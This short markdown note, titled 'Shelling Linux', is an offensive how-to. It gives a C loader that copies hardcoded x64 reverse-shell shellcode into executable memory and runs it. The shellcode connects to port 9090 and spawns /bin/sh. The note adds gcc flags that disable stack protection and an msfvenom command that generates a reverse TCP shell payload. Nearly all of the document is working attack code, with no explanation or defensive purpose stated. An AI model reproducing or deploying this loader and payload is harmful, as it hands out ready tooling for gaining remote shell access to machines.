# Shelling Linux
## C code
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

unsigned char shellcode[] = 
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97"
"\x48\xb9\x02\x00\x23\x82\x7f\x17\x02\x01\x51\x48\x89\xe6"
"\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce"
"\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f"
"\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48"
"\x89\xe6\x0f\x05";


int main(int argc, char **argv) {
    // Allocate memory with executable permissions using mmap
    void *exec_mem = mmap(NULL, sizeof(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC, 
                          MAP_ANON | MAP_PRIVATE, -1, 0);
    if (exec_mem == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }

    // Copy the shellcode to the allocated executable memory
    memcpy(exec_mem, shellcode, sizeof(shellcode));

    // Cast exec_mem to a function pointer and call it
    int (*ret)() = (int(*)())exec_mem;
    ret();

    return 0;
}
```
## Compiling
`gcc lin_basic_v01.c -o lin_basic_v01 -fno-stack-protector -z execstack`

## MSFvenom Shell Code
`msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=9090 -f c`

